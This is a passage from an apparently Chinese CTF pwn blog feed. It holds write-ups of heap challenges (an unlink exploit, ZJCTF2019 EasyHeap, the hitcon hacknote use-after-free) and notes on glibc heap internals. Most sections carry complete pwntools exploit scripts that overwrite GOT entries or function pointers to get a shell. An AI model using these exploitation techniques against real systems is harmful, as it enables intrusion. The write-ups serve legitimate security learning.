p.recvuntil(<span class="hljs-string">&quot;]&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;abc&quot;</span>) <span class="hljs-comment"># name</span><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;def&quot;</span>) <span class="hljs-comment"># addr</span><br><br>ptr = <span class="hljs-number">0x602120</span><br>fd = ptr - <span class="hljs-number">0x18</span><br>bk = ptr - <span class="hljs-number">0x10</span><br><br>new(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(fd) + p64(bk) )<br>new(<span class="hljs-number">0x0</span>,  <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x10</span>)  <br>new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <br><br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">0x0</span>, <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>))  <span class="hljs-comment"># overflow </span><br><br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br>free_got = e.got[<span class="hljs-string">&quot;free&quot;</span>]<br>atoi_got = e.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x03&#x27;</span> * <span class="hljs-number">0x18</span> + p64(atoi_got))<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Content is &quot;</span>)<br><br>atoi = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;atoi :&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(atoi)))<br><br><br><span class="hljs-comment"># # local </span><br><span class="hljs-comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span><br><span class="hljs-comment">#libc.address =  atoi - libc.sym[&#x27;atoi&#x27;]</span><br><span class="hljs-comment">#system = libc.sym[&quot;system&quot;]</span><br><span class="hljs-comment">#log.info(&quot;system :&quot; + str(hex(system)))</span><br><span class="hljs-comment"># one_gadget :</span><br><span class="hljs-comment">#system = libc.address + 0xef9f4 </span><br><br><span class="hljs-comment"># remote</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;atoi&quot;</span>, atoi)<br>offset = atoi - libc.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span> , p64(system))<br><br>p.interactive() <span class="hljs-comment"># input /bin/sh</span><br></code></pre></td></tr></table></figure><h3 id="ZJCTF2019-EasyHeap"><a href="#ZJCTF2019-EasyHeap" class="headerlink" title="ZJCTF2019 EasyHeap"></a>ZJCTF2019 EasyHeap</h3><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p><p>因此可以溢出</p><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p><ol><li><p>首先申请三个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure><p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg"></p><p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p></li><li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg"></p><p>查看heaparray地址上的值：</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg"></p><p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p></li><li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure><p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p></li><li><p>这时edit(0)会修改<code>free@got</code>的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure><p>将其函数改为system函数的plt表</p></li><li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p></li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2022/11/22/ctf-pwn/UAF/"/>
    <url>/2022/11/22/ctf-pwn/UAF/</url>
    
    <content type="html"><![CDATA[<h4 id="参考ctf-wiki"><a href="#参考ctf-wiki" class="headerlink" title="参考ctf-wiki"></a>参考ctf-wiki</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p><h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure><p>程序中给了system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h4><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>下面介绍这个exp的原理</p><p>在delete 0和1之后fastbin结构如下图</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;第 1 页\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div><script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>chunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间<p>chunk C、D是<code>note[1]</code>的空间</p><p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p><p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p><p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p><p>理论是如此，下面用gdb验证一下</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>在ida中可以看到notelist的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure><p>查看三次notelist的内容，</p><p><img src="/img/UAF/1.jpg"></p><p><img src="/img/UAF/2.jpg"></p><p><img src="/img/UAF/3.jpg"></p><p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p><p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap 基础知识</title>
    <link href="/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>size = 0时，返回系统允许的最小内存块</p><p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p><h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h3><p>会清空chunk，并且不从tcache种拿chunk，但是free时还是会放到tcache bin</p><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p><p>不开ASLR，初始时都指向bss段末尾（end_data)</p><p>开启ASLR，会随机向后偏移一段距离</p><p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p><p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytes，including overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><strong><code>prevsize </code>：</strong>如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p><p><strong><code>size</code>：</strong>此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p><p>没有 <strong>fd bk fd_nextsieze bk_nextsize</strong></p><p><strong><code>userdata</code>：</strong>数据</p><p>（下一个chunk的prevsize也会存储userdata）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure><p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p><p><code>size</code>：同上</p><p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p><p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p><h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><p>除了fastbin被存储在一个长度为10的fastbinY的数组里，其余的small large unsorted bin都存储在一个bins数组里</p><p>NBINS是126，包括1个unsorted bin，62个small bin，63个large bin。</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;第 1 